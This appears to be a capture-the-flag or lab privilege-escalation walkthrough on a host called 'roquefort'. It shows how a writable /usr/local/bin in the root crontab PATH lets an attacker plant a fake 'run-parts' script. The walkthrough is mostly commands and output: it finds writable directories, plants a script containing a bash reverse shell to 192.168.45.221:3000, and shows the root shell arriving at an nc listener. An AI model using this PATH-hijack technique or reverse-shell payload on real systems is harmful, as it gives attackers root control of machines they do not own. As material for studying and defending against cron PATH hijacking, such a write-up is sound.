
# Writable Path in Cronjob

When discovering that u have write access to the path inside the /etc/crontab file, we can create an malicious reverse shell script imitiating one of the scripts processed by one of the crontabs.

---

Displaying the /etc/crontab file.

```
chloe@roquefort:~/gitea-repositories/saitama/vuln.git$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Identifying write access to the path --> /usr/local/bin

```
chloe@roquefort:~/gitea-repositories/saitama/vuln.git$ find / -type d -writable 2>/dev/null
/var/lib/gitea
/var/lib/gitea/custom
/var/tmp
/run/lock
/proc/2465/task/2465/fd
/proc/2465/fd
/proc/2465/map_files
/dev/mqueue
/dev/shm
/usr/local/bin
/tmp
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.font-unix
/tmp/.XIM-unix
/home/chloe
```

Let's create an malicious "run-parts" file and put into the /usr/local/bin


```
chloe@roquefort:/usr/local/bin$ cat run-parts 
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221/3000 0>&1'
```

The cronjob will now process our script with root perms and we should gain root rce on our listener.

```
nc -lvnp 3000
listening on [any] 3000 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.67] 51974
bash: cannot set terminal process group (2578): Inappropriate ioctl for device
bash: no job control in this shell
root@roquefort:/#
```